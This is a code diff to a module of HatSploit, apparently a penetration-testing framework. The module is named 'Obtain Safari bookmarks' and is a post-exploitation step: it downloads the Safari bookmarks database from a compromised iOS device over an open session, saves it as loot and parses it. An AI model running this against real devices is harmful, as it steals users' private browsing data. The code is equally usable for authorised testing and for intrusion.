@@ -6,12 +6,13 @@
 #
 
 from hatsploit.lib.module import Module
+from hatsploit.lib.sessions import Sessions
+from hatsploit.lib.loot import Loot
 
-from hatsploit.utils.session import SessionTools
-from hatsploit.utils.db import DBTools
+from pex.tools.db import DBTools
 
 
-class HatSploitModule(Module, SessionTools, DBTools):
+class HatSploitModule(Module, Sessions, DBTools):
     details = {
         'Category': "post",
         'Name': "Obtain Safari bookmarks",
@@ -30,20 +31,25 @@ class HatSploitModule(Module, SessionTools, DBTools):
             'Value': None,
             'Type': "session",
             'Required': True
+        },
+        'PATH': {
+            'Description': "Path to save file.",
+            'Value': Loot().specific_loot('Bookmarks.db'),
+            'Type': None,
+            'Required': True
         }
     }
 
     def run(self):
-        session = self.parse_options(self.options)
+        session, path = self.parse_options(self.options)
+        bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'
 
-        bookmarks_path = '/private/var/mobile/Library/Safari/Bookmarks.db'
-        local_path = self.session_download(session, bookmarks_path)
-
-        if local_path:
+        path = self.session_download(session, bookmarks, path)
+        if path:
             self.print_process("Parsing bookmarks database...")
 
             try:
-                bookmarks = self.parse_safari_bookmarks(local_path + 'Bookmarks.db')
+                bookmarks = self.parse_safari_bookmarks(path)
             except Exception:
                 self.print_error("Failed to parse bookmarks database!")
                 return
